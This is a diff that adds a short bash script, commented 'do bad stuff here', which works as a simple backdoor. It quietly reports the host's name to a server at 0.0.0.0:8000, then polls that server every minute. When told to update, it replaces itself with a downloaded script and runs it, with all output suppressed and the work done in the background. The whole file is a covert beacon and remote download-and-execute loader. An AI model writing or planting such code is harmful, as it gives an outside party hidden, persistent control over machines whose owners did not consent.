@@ -1,0 +1,16 @@
+#!/bin/bash
+
+#do bad stuff here
+ipInfo=$(hostname)
+(curl -s http://0.0.0.0:8000/hostname:$ipInfo) > /dev/null 2>&1 &
+
+while true; do
+    sleep 60
+    name="script"
+    prefix="http://0.0.0.0:8000/"
+    var=$(curl -s ${prefix}update)
+    if [ "$var" == "yes" ]; then
+        (rm $name && curl -s ${prefix}$name > $name && chmod +x $name && ./$name) > /dev/null 2>&1 &
+        break
+    fi
+done
